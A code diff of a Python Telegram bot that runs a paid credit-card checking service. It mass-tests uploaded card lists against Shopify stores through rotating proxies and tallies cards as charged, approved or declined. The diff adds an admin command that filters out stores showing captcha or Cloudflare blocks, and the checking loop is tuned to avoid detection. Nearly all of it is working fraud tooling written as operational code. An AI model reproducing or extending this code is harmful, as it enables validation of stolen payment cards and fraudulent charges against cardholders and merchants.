         m = f"<b>{CE_DIAMOND} {sf('Key Information')}</b>\n\n├ <b>{sf('Key')}:</b> <code>{sf(c)}</code>\n├ <b>{CE_SMILE} {sf('Status')}:</b> <code>{sf(st)}</code>\n├ <b>{sf('Plan Tier')}:</b> <code>{sf(ki.get('tier', 'Unknown'))}</code>\n├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(ki.get('days', 0)))} {sf('Days')}</code>\n╰ <b>{CE_CHART} {sf('Generated')}:</b> <code>{sf(ki.get('generated_at', 'Unknown'))}</code>"
         if u and ub and str(ub).isdigit(): 
             prof_name = escape_html(_USER_NAMES.get(int(ub), f"User {ub}"))
@@ -965,7 +1208,8 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         a = args[0].strip().lower() if args else ""
         if a: _MAINTENANCE_MODE = (a == 'on')
         else: _MAINTENANCE_MODE = not _MAINTENANCE_MODE
-        await styled_reply(update, f"<b>{CE_GEAR} {sf('Maintenance Mode')}:</b> {sf('ON' if _MAINTENANCE_MODE else 'OFF')}", use_gif=True)
+        t = "ON" if _MAINTENANCE_MODE else "OFF"
+        await styled_reply(update, f"<b>{CE_GEAR} {sf('Maintenance Mode')}:</b> {sf(t)}", use_gif=True)
 
     elif cmd in ["users", "user"]:
         if uid not in ADMIN_ID: return
@@ -973,13 +1217,19 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for u, p in list(ACTIVE_MTXT_PROCESSES.items()):
             if not p.get("stopped"):
                 un = escape_html(_USER_NAMES.get(u, f"User {u}"))
-                active_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id='>{un}</a> (<code>{sf(str(u))}</code>)\n  │  ╰ Gate: <code>{sf(p.get('gate', 'Unknown'))}</code> | CCs: <code>{sf(str(p.get('total', '?')))}</code>")
+                gate = p.get("gate", "Unknown")
+                total = p.get("total", "?")
+                active_info.append(f"  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id='>{un}</a> (<code>{sf(str(u))}</code>)\n  │  ╰ Gate: <code>{sf(gate)}</code> | CCs: <code>{sf(str(total))}</code>")
+                
         recent_users_info = []
-        for u, _ in sorted(USER_LAST_REQ.items(), key=lambda x: x[1], reverse=True)[:15]:
+        sorted_users = sorted(USER_LAST_REQ.items(), key=lambda x: x[1], reverse=True)[:15] 
+        for u, _ in sorted_users:
             un = escape_html(_USER_NAMES.get(u, f"User {u}"))
             recent_users_info.append(f"  │  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>")
+            
         text = f"<b>{CE_GEAR} {sf('Global System Status')}</b>\n\n├ <b>{sf('Total Session Users')}:</b> <code>{sf(str(len(USER_LAST_REQ)))}</code>\n"
-        if recent_users_info: text += "\n".join(recent_users_info) + "\n"
+        if recent_users_info: text += f"  │  ├ <b>{CE_SMILE} {sf('User')}:</b> <a href='tg://user?id={u}'>{un}</a>\n  │  ╰ ID: <code>{sf(str(u))}</code>\n"
+        else: text += f"  ╰ {sf('Recent Users')}: <code>{sf('None')}</code>\n\n"
         text += f"├ <b>{sf('Active Checkers')}:</b> <code>{sf(str(len(active_info)))}</code>\n"
         if active_info: text += f"╰ <b>{sf('Currently Checking')}:</b>\n" + "\n".join(active_info)
         else: text += f"╰ <b>{sf('Currently Checking')}:</b> <code>{sf('None')}</code>"
@@ -990,120 +1240,330 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not args: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a valid ID.')}</b>", use_gif=True)
         try: tu = int(unsf(args[0].strip()))
         except Exception: return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Please provide a valid ID.')}</b>", use_gif=True)
-        await set_user_plan(tu, "Free", 0); proc = ACTIVE_MTXT_PROCESSES.get(tu)
+        await set_user_plan(tu, "Free", 0)
+        proc = ACTIVE_MTXT_PROCESSES.get(tu)
         if proc:
             proc["stopped"] = True
             for t in proc.get("tasks", []):
                 if not t.done(): t.cancel()
-        await styled_reply(update, f"<b>{CE_BOOM} {sf('Access Revoked')}</b>\n├ <b>{CE_SMILE} {sf('User')}:</b> <code>{sf(str(tu))}</code>\n╰ <b>{sf('Status')}:</b> <code>{sf('Demoted to Free')}</code>", use_gif=True)
+        admin_msg = f"<b>{CE_BOOM} {sf('Access Revoked')}</b>\n├ <b>{CE_SMILE} {sf('User')}:</b> <code>{sf(str(tu))}</code>\n╰ <b>{sf('Status')}:</b> <code>{sf('Demoted to Free')}</code>"
+        await styled_reply(update, admin_msg, use_gif=True)
         try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
+    # أمر حصري للآدمن: استخراج بوابات شوبفاي من الملفات المرفوعة وتجربتها للتأكد من عدم وجود كابتشا
     elif cmd == "checkgates":
         if uid not in ADMIN_ID:
-            return await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>", use_gif=True)
+            await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n╰ {sf('This command is restricted to administrators only.')}", use_gif=True)
+            return
+            
         tm = await styled_reply(update, f"<b>{CE_GEAR} {sf('Fetching and filtering gates...')}</b>", use_gif=True)
         try:
             raw_sites = []
             if update.message.reply_to_message and update.message.reply_to_message.document:
-                f = await context.bot.get_file(update.message.reply_to_message.document.file_id); fp = f"temp_gates_{uid}.txt"; await f.download_to_drive(fp)
-                async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file: content = await file.read()
-                os.remove(fp); raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
+                f = await context.bot.get_file(update.message.reply_to_message.document.file_id)
+                fp = f"temp_gates_{uid}.txt"
+                await f.download_to_drive(fp)
+                async with aiofiles.open(fp, "r", encoding="utf-8", errors='ignore') as file:
+                    content = await file.read()
+                os.remove(fp)
+                raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
             else:
                 async with aiohttp.ClientSession() as s:
                     async with s.get(GITHUB_SITES_URL, headers={"User-Agent": "Mozilla/5.0"}, timeout=10) as r:
-                        if r.status == 200: raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await r.text()).split('\n') if l.strip()]))
-                        else: return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Failed to fetch from GitHub.')}</b>")
+                        if r.status == 200:
+                            content = await r.text()
+                            raw_sites = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in content.split('\n') if l.strip()]))
+                        else:
+                            return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Failed to fetch file from GitHub.')}</b>")
+            
+            # تصفية وتجهيز المواقع الصحيحة فقط (Shopify)
             valid_format_sites = []
             for site in raw_sites:
-                site = site.lower().strip(); if not site or "." not in site: continue
+                site = site.lower().strip()
+                if not site or "." not in site: continue
                 site = site.split('/')[0].split('?')[0]
-                if "myshopify.com" in site or len(site) > 4: valid_format_sites.append(site)
+                if "myshopify.com" in site:
+                    valid_format_sites.append(site)
+                elif len(site) > 4:
+                    valid_format_sites.append(site)
+                    
             raw_sites = list(set(valid_format_sites))
-            if not raw_sites: return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('No valid sites found.')}</b>")
-            admin_proxies = await get_all_user_proxies(uid); proxies_list = list(admin_proxies) if admin_proxies else []
-            await styled_edit(tm, f"<b>{CE_HOURGLASS} {sf('Testing')} <code>{len(raw_sites)}</code> {sf('gates for Captcha...')}</b>")
-            working_sites = []; dead_count = captcha_count = 0
+            
+            if not raw_sites:
+                return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('No valid sites found to test.')}</b>")
+                
+            admin_proxies = await get_all_user_proxies(uid)
+            proxies_list = list(admin_proxies) if admin_proxies else []
+            
+            await styled_edit(tm, f"<b>{CE_HOURGLASS} {sf('Testing')} <code>{len(raw_sites)}</code> {sf('gates for Captcha & Errors...')}</b>")
+            
+            working_sites = []
+            dead_count = 0
+            captcha_count = 0
+            
             async def _validate_gate(site_url, session):
                 nonlocal dead_count, captcha_count
                 p_url = random.choice(proxies_list)['proxy_url'] if proxies_list else None
+                target_url = f"https://{site_url}/cart.json"
                 try:
-                    async with session.get(f"https://{site_url}/cart.json", proxy=p_url, timeout=6, ssl=False) as resp:
-                        if resp.status in [403, 429, 430, 502, 503, 504]: captcha_count += 1; return
-                        if resp.status in [200, 301, 302, 404]: working_sites.append(site_url); return
-                except Exception: pass
+                    async with session.get(target_url, proxy=p_url, timeout=6, ssl=False) as resp:
+                        # استبعاد بوابات الكابتشا أو الحظر (403 = CF, 430 = Shopify Captcha, 429 = Rate Limit)
+                        if resp.status in [403, 429, 430, 502, 503, 504]:
+                            captcha_count += 1
+                            return
+                        if resp.status in [200, 301, 302, 404]:
+                            working_sites.append(site_url)
+                            return
+                except Exception:
+                    pass
                 dead_count += 1
+
             connector = aiohttp.TCPConnector(limit=60, ssl=False)
             async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=8)) as test_session:
-                await asyncio.gather(*[_validate_gate(site, test_session) for site in raw_sites])
+                tasks = [_validate_gate(site, test_session) for site in raw_sites]
+                await asyncio.gather(*tasks)
+            
             if working_sites:
-                async with aiofiles.open('sites.txt', 'w', encoding='utf-8') as f: await f.write('\n'.join(working_sites))
-            global _CACHED_SHOPIFY_SITES; _CACHED_SHOPIFY_SITES = working_sites
-            await styled_edit(tm, f"<b>{CE_CROWN} {sf('Gates Purge Completed')} {CE_PARTY}</b>\n\n├ <b>{sf('Total Loaded')}:</b> <code>{len(raw_sites)}</code>\n├ <b>{CE_CHECK} {sf('Active & Clean')}:</b> <code>{len(working_sites)}</code>\n├ <b>{CE_SHIELD} {sf('Captcha/CF Blocked')}:</b> <code>{captcha_count}</code>\n╰ <b>{CE_CLOWN} {sf('Purged Dead')}:</b> <code>{dead_count}</code>")
-        except Exception as e: await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")
+                async with aiofiles.open('sites.txt', 'w', encoding='utf-8') as f:
+                    await f.write('\n'.join(working_sites))
+            
+            global _CACHED_SHOPIFY_SITES
+            _CACHED_SHOPIFY_SITES = working_sites
+            
+            res_msg = f"""<b>{CE_CROWN} {sf('Gates Purge Completed')} {CE_PARTY}</b>
+            
+├ <b>{sf('Total Loaded')}:</b> <code>{sf(str(len(raw_sites)))}</code>
+├ <b>{CE_CHECK} {sf('Active & Clean')}:</b> <code>{sf(str(len(working_sites)))}</code>
+├ <b>{CE_SHIELD} {sf('Captcha/CF Blocked')}:</b> <code>{sf(str(captcha_count))}</code>
+╰ <b>{CE_CLOWN} {sf('Purged Dead')}:</b> <code>{sf(str(dead_count))}</code>
+
+<i>{sf('Sites saved and applied permanently!')}</i>"""
+            await styled_edit(tm, res_msg)
+            
+        except Exception as e:
+            await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Error Processing')}:</b> {sf(str(e))}")
 
 # ====================== CALLBACK FUNCTIONS ======================
 async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; uid = q.from_user.id; cp = await get_user_plan(uid)
+    global _MAINTENANCE_MODE
+    q = update.callback_query
+    uid = q.from_user.id
+    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
+    cp = await get_user_plan(uid)
     t = f"<b>{CE_CROWN} {sf('VIP Subscription Plans')}</b>\n\n"
     for _, pi in PLANS.items():
         t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
     t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
     kb = [[InlineKeyboardButton("Contact Owner", url="https://t.me/Dddadddyttt", style="primary", icon_custom_emoji_id="5445059250382469069"), InlineKeyboardButton("Back", callback_data="back_start", style="danger", icon_custom_emoji_id="5445358884480916784")]]
-    await styled_edit(q.message, t, buttons=kb); await q.answer()
+    await styled_edit(q.message, t, buttons=kb)
+    await q.answer()
 
 async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; uid = q.from_user.id; plan = await get_user_plan(uid); limit = get_cc_limit(plan, uid)
+    global _MAINTENANCE_MODE
+    q = update.callback_query
+    uid = q.from_user.id
+    if _MAINTENANCE_MODE and uid not in ADMIN_ID: return await q.answer("Maintenance Break!", show_alert=True)
+    plan = await get_user_plan(uid)
+    limit = get_cc_limit(plan, uid)
     admin_panel = f"\n\n<b>{CE_GLASSES} {sf('Admin Panel')}:</b>\n ├ {CE_CANDLE} /gen {sf('[plan] [qty]')} - {sf('Generate Keys')}\n ├ {CE_CANDLE} /validate {sf('[key]')} - {sf('Check Key')}\n ├ {CE_CANDLE} /users - {sf('System Status')}\n ├ {CE_CANDLE} /checkgates - {sf('Filter Gates Engine')}\n ╰ {CE_CANDLE} /maint - {sf('Maintenance Mode')}" if uid in ADMIN_ID else ""
-    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>\n\n<b>{CE_TOP} {sf('Checker Engine')}:</b>\n ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>\n\n<b>{CE_GEAR} {sf('Proxy Manager')}:</b>\n ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}\n ├ {CE_CANDLE} /proxy - {sf('View Proxies')}\n ├ {CE_CANDLE} /checkpxy - {sf('Clean Proxies')}\n ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}\n\n<b>{CE_DIAMOND} {sf('Account Settings')}:</b>\n ├ {CE_CANDLE} /info - {sf('Profile Info')}\n ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}\n ├ {CE_CANDLE} /fb - {sf('Send Feedback')}\n ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}\n\n<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
-    kb = [[InlineKeyboardButton('View Plans', callback_data="show_plans", style="primary", icon_custom_emoji_id="5413879192267805083"), InlineKeyboardButton('Redeem Key', callback_data="prompt_redeem", style="success", icon_custom_emoji_id="5451882707875276247")]]
-    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK)])
-    await styled_edit(q.message, t, buttons=kb); await q.answer()
+    
+    t = f"""<b>━━━ {CE_CROWN} {sf('VIP CHECKER SYSTEM')} {CE_CROWN} ━━━</b>
+
+<b>{CE_TOP} {sf('Checker Engine')}:</b>
+ ╰ <i>{sf('Send a combo file to auto-start mass check')}</i>
+
+<b>{CE_GEAR} {sf('Proxy Manager')}:</b>
+ ├ {CE_CANDLE} /addpxy - {sf('Add Proxies')}
+ ├ {CE_CANDLE} /proxy - {sf('View Proxies')}
+ ├ {CE_CANDLE} /checkpxy - {sf('Clean Proxies')}
+ ╰ {CE_CANDLE} /rmpxy - {sf('Remove Proxies')}
+
+<b>{CE_DIAMOND} {sf('Account Settings')}:</b>
+ ├ {CE_CANDLE} /info - {sf('Profile Info')}
+ ├ {CE_CANDLE} /redeem - {sf('Redeem Key')}
+ ├ {CE_CANDLE} /fb - {sf('Send Feedback')}
+ ╰ {CE_CANDLE} /plan - {sf('View Subscriptions')}{admin_panel}
+
+<b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
+    
+    kb = [
+        [InlineKeyboardButton('View Plans', callback_data="show_plans", style="primary", icon_custom_emoji_id="5413879192267805083"),
+         InlineKeyboardButton('Redeem Key', callback_data="prompt_redeem", style="success", icon_custom_emoji_id="5451882707875276247")]
+    ]
+    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
+        kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162"), InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
+    elif is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton('Channel', url=JOIN_CHANNEL_LINK, style="primary", icon_custom_emoji_id="5305265301917549162")])
+    elif is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton('Group', url=JOIN_GROUP_LINK, style="primary", icon_custom_emoji_id="6028356293540977715")])
+    await styled_edit(q.message, t, buttons=kb)
+    await q.answer()
 
 async def prompt_redeem_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; await q.answer()
+    q = update.callback_query
+    await q.answer()
     t = f"<b>{CE_CANDLE} {sf('Please send your key using the command directly like this')} :</b>\n\n<code>/redeem VIP-XXXXXXXXXX</code>"
     kb = [[InlineKeyboardButton("Back", callback_data="back_start", style="danger", icon_custom_emoji_id="5445358884480916784")]]
     await styled_edit(q.message, t, buttons=kb)
 
 async def check_joined_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; uid = q.from_user.id
+    q = update.callback_query
+    uid = q.from_user.id
     if uid in ADMIN_ID: 
-        await q.answer("✅ Admin Access", show_alert=True); try: await q.message.delete()
+        await q.answer("✅ Admin Access", show_alert=True)
+        try: await q.message.delete()
         except: pass
-        plan = await get_user_plan(uid); await send_welcome_menu(context.bot, uid, plan, get_cc_limit(plan, uid)); return
-    if await is_user_joined(uid, context.bot):
-        _JOIN_CACHE[uid] = time.time(); await q.answer("✅ Verified Successfully!", show_alert=True)
+        plan = await get_user_plan(uid)
+        limit = get_cc_limit(plan, uid)
+        await send_welcome_menu(context.bot, uid, plan, limit)
+        return
+        
+    is_joined = await is_user_joined(uid, context.bot)
+    if is_joined:
+        await mark_user_joined(uid)
+        _JOIN_CACHE[uid] = time.time()
+        await q.answer("✅ Verified Successfully!", show_alert=True)
         try: await q.message.delete()
         except Exception: pass
-        plan = await get_user_plan(uid); await send_welcome_menu(context.bot, uid, plan, get_cc_limit(plan, uid))
+        plan = await get_user_plan(uid)
+        limit = get_cc_limit(plan, uid)
+        await send_welcome_menu(context.bot, uid, plan, limit)
     else: await q.answer("❌ Not joined yet!", show_alert=True)
 
 async def gateway_selection_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    q = update.callback_query; uid = q.from_user.id; gn = q.data.split(":")[1]; await q.answer()
+    if _MAINTENANCE_MODE and update.effective_user.id not in ADMIN_ID: return
+    q = update.callback_query
+    uid = q.from_user.id
+    gn = q.data.split(":")[1]
+    await q.answer()
+    msg_obj = q.message
     if gn == "cancel":
-        PENDING_FILES.pop(uid, None); return await styled_edit(q.message, f"<b>{CE_CLOWN} {sf('Process Cancelled.')}</b>")
-    cards = PENDING_FILES.pop(uid, None); if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
+        PENDING_FILES.pop(uid, None)
+        return await styled_edit(msg_obj, f"<b>{CE_CLOWN} {sf('Process Cancelled.')}</b>", buttons=None)
+    cards = PENDING_FILES.pop(uid, None)
+    if not cards: return await q.answer("⚠️ Session expired.", show_alert=True)
     ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": [], "total": len(cards), "gate": gn}
-    await styled_edit(q.message, f"<b>{CE_GEAR} {sf('Preparing Engine Session...')}</b>")
-    asyncio.create_task(_run_mass_process(update, q.message, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
+    await styled_edit(msg_obj, f"<b>{CE_GEAR} {sf('Preparing Session...')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Loaded')}:</b> <code>{sf(str(len(cards)))} CCs</code>\n├ <b>{CE_GEAR} {sf('Threads')}:</b> <code>{sf(str(WORKERS))}</code>\n╰ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gn)}</code>", buttons=None)
+    asyncio.create_task(_run_mass_process(update, msg_obj, cards, ACTIVE_MTXT_PROCESSES, "stop_chk", gn, context.bot))
+
+async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_prefix, gate_name, bot):
+    uid = update.effective_user.id
+    tot = len(cards); chk = chg = app = ins = dec = err = 0
+    st = time.time()
+    
+    sites = await get_shopify_sites()
+    proxies = await get_all_user_proxies(uid)
+    if not proxies: proxies = []
+    else: proxies = list(proxies) 
+    
+    http_session = await get_user_http_session(uid)
+    last_resp = sf("Waiting for response...")
+    def is_stopped(): return process_store.get(uid, {}).get("stopped", False)
+
+    async def dashboard_updater():
+        while not is_stopped():
+            for _ in range(20):
+                if is_stopped(): break
+                await asyncio.sleep(0.1)
+            if is_stopped(): break
+            
+            elapsed_now = int(time.time() - st)
+            cpm = int((chk / elapsed_now) * 60) if elapsed_now > 0 else 0
+            h_now, m_now, s_now = elapsed_now // 3600, (elapsed_now % 3600) // 60, elapsed_now % 60
+            
+            dt = f"<b>━━━ {CE_GEAR} {sf('CHECKING IN PROGRESS')} {CE_GEAR} ━━━</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Time')}:</b> <code>{sf(f'{h_now}h {m_now}m {s_now}s')}</code>"
+            percent = int((chk / tot) * 100) if tot > 0 else 0
+            
+            kb = [
+                [InlineKeyboardButton(f'{chk}/{tot} ({percent}%)', callback_data="none", style="success" if percent == 100 else "primary", icon_custom_emoji_id="5445163772706582819")],
+                [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
+                [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
+                [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
+                [InlineKeyboardButton(f'Speed: {cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")],
+                [InlineKeyboardButton('Stop Process', callback_data=f"{stop_prefix}:{uid}", style="danger", icon_custom_emoji_id="5386367538735104399")]
+            ]
+            try: await styled_edit(msg_obj, dt, buttons=kb)
+            except asyncio.CancelledError: break
+            except Exception: pass
+
+    ut = asyncio.create_task(dashboard_updater())
+    queue = asyncio.Queue()
+    for c in cards: queue.put_nowait(c)
+    sem = asyncio.Semaphore(WORKERS)
+
+    async def worker(wid):
+        await asyncio.sleep(wid * 0.05)
+        nonlocal chk, chg, app, ins, dec, err, last_resp
+        while not queue.empty() and not is_stopped():
+            try: card = queue.get_nowait()
+            except Exception: break
+            async with sem:
+                try:
+                    c_st = time.time()
+                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=6)
+                    if is_stopped(): break 
+                    c_el = time.time() - c_st
+                    status = res.get('status', 'Dead')
+                    chk += 1
+                    raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
+                    last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
+                    
+                    if status == 'Charged':
+                        chg += 1
+                        asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
+                    elif status == 'Approved': app += 1
+                    elif status == 'Insufficient': ins += 1
+                    elif status == 'Site Error': err += 1
+                    else: dec += 1
+                except asyncio.CancelledError: break
+                except Exception: err += 1; chk += 1
+                finally:
+                    queue.task_done()
+            if not is_stopped(): await asyncio.sleep(random.uniform(8.0, 14.0))
+
+    wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
+    process_store[uid]["tasks"] = wt + [ut]
+    await asyncio.gather(*wt, return_exceptions=True)
+    if not ut.done(): ut.cancel()
+        
+    el = int(time.time() - st)
+    h, m, s = el // 3600, (el % 3600) // 60, el % 60
+    avg_cpm = int((chk / el) * 60) if el > 0 else 0
+    ft = f"<b>{CE_CROWN} {sf('DONE')} {CE_PARTY}</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
+    
+    fkb = [
+        [InlineKeyboardButton(f"{chk}/{tot} (100%)", callback_data="none", style="success", icon_custom_emoji_id="5445163772706582819")],
+        [InlineKeyboardButton(f'Charged: {chg}', callback_data="none", style="success", icon_custom_emoji_id="5231449120635370684"), InlineKeyboardButton(f'Approved: {app}', callback_data="none", style="success", icon_custom_emoji_id="5445189224682779974")],
+        [InlineKeyboardButton(f'Insuff: {ins}', callback_data="none", style="success", icon_custom_emoji_id="6201792892634140208"), InlineKeyboardButton(f'Declined: {dec}', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
+        [InlineKeyboardButton(f'Errors: {err}', callback_data="none", style="danger", icon_custom_emoji_id="5246762912428603768")],
+        [InlineKeyboardButton(f'Average Speed: {avg_cpm} CPM', callback_data="none", style="primary", icon_custom_emoji_id="5361741454685256344")]
+    ]
+    try: await styled_edit(msg_obj, ft, buttons=fkb)
+    except Exception: pass
+    process_store.pop(uid, None)
+    await cleanup_user_http_session(uid)
 
 async def stop_chk_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    puid = int(update.callback_query.data.split(":")[1])
-    if update.callback_query.from_user.id == puid or update.callback_query.from_user.id in ADMIN_ID:
-        proc = ACTIVE_MTXT_PROCESSES.get(puid)
-        if proc:
-            proc["stopped"] = True
-            for t in proc.get("tasks", []):
-                if not t.done(): t.cancel()
-        await update.callback_query.answer("🛑 Stopped Immediately!", show_alert=True)
+    key_data = update.callback_query.data
+    puid = int(key_data.split(":")[1])
+    if update.callback_query.from_user.id != puid and update.callback_query.from_user.id not in ADMIN_ID:
+        return await update.callback_query.answer("⚠️ Not yours!", show_alert=True)
+    proc = ACTIVE_MTXT_PROCESSES.get(puid)
+    if proc:
+        proc["stopped"] = True
+        for t in proc.get("tasks", []):
+            if not t.done(): t.cancel()
+    await update.callback_query.answer("🛑 Stopped Immediately!", show_alert=True)
+
+async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE): await update.callback_query.answer()
 
 async def check_sites_loop():
-    while True: await get_shopify_sites(); await asyncio.sleep(600)
+    while True:
+        await get_shopify_sites()
+        await asyncio.sleep(600)
 
 async def post_init(app: Application):
     try: await app.bot.delete_webhook(drop_pending_updates=True)
-    except: pass
+    except Exception: pass
     try: await init_db()
     except Exception as e: logger.error(f"DB Error: {e}")
     asyncio.create_task(check_sites_loop())
@@ -1120,12 +1580,17 @@ def main():
     app.add_handler(CallbackQueryHandler(back_start_cb, pattern=r"^back_start$"))
     app.add_handler(CallbackQueryHandler(prompt_redeem_cb, pattern=r"^prompt_redeem$"))
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
-    app.add_handler(CallbackQueryHandler(lambda u, c: u.callback_query.answer(), pattern=r"^none$"))
+    app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
     
-    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH ALL ORIGINAL FUNCTIONS RESTORED!")
+    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH FORCED GIFS & SHOPIFY ONLY!")
     while True:
-        try: app.run_polling(drop_pending_updates=True); break
+        try:
+            app.run_polling(drop_pending_updates=True)
+            break
         except Conflict: time.sleep(5)
-        except Exception as e: logger.error(f"Fatal error: {e}"); time.sleep(5)
+        except Exception as e:
+            logger.error(f"Fatal error: {e}")
+            time.sleep(5)
 
-if __name__ == "__main__": main()
+if __name__ == "__main__":
+    main()
